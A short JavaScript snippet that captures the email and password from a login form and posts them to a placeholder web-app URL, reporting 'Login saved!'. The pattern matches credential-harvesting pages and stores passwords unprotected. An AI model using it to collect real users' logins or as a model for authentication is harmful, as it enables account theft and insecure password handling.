document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  fetch("YOUR_WEB_APP_URL", {
    method: "POST",
    body: JSON.stringify({ email, password }),
    headers: {
      "Content-Type": "application/json"
    }
  })
  .then(res => res.text())
  .then(data => {
    document.getElementById("status").innerText = "Login saved!";
  })
  .catch(error => {
    document.getElementById("status").innerText = "Error saving data.";
    console.error(error);
  });
});